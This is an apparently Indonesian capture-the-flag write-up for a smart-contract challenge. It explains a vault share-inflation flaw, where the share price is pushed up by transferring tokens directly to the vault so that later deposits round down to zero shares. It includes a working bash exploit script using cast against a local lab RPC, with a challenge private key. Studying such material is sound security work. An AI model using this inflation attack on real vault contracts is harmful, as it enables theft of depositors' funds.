# Writeup <Judul Soal>

protocol sus (ada method rug), tujuan player = agar owner gabisa rug

vuln:
```newShares = (_amount * currentShares) / currentBalance;```
currentBalance diambil dari token.balanceOf(address(this)), sehingga player bisa melakukan inflasi
harga dengan transfer langsung ke kontrak vault -> pembagi besar -> rounding bawah -> zero

skema:
- player mint 1eth coin
- player deposit 1wei token ke vault
- player transfer (1eth-1wei) token ke vault contract langsung


Exploit Script
```
#!/bin/bash
export RPC_URL=http://localhost:48334/f51e3691-ef77-40fc-9683-454fbcfc66d8
export PRIVATE_KEY=0x0f4a7f8efacf2024bf3d04659f08aff0724160c49f7e5d6354798cfcaacf4c64
export SETUP_ADDR=0x79dc4113Fd4E35AB674f62A30c4bcE0efbF6e2a3

CHALLENGE_ADDR=$(cast call $SETUP_ADDR "challenge()" --rpc-url $RPC_URL)
CHALLENGE_ADDR="0x${CHALLENGE_ADDR:26:40}"

VAULT_ADDR=$(cast call $CHALLENGE_ADDR "vault()" --rpc-url $RPC_URL)
VAULT_ADDR="0x${VAULT_ADDR:26:40}"

TOKEN_ADDR=$(cast call $CHALLENGE_ADDR "token()" --rpc-url $RPC_URL)
TOKEN_ADDR="0x${TOKEN_ADDR:26:40}"

cast send $TOKEN_ADDR "buyTokens()" --value 1ether --private-key $PRIVATE_KEY --rpc-url $RPC_URL
cast send $TOKEN_ADDR "approve(address,uint256)" $VAULT_ADDR 1 --private-key $PRIVATE_KEY --rpc-url $RPC_URL
cast send $VAULT_ADDR "deposit(uint256)" 1 --private-key $PRIVATE_KEY --rpc-url $RPC_URL
cast send $TOKEN_ADDR "transfer(address,uint256)" $VAULT_ADDR 999999999999999999 --private-key $PRIVATE_KEY --rpc-url $RPC_URL
```
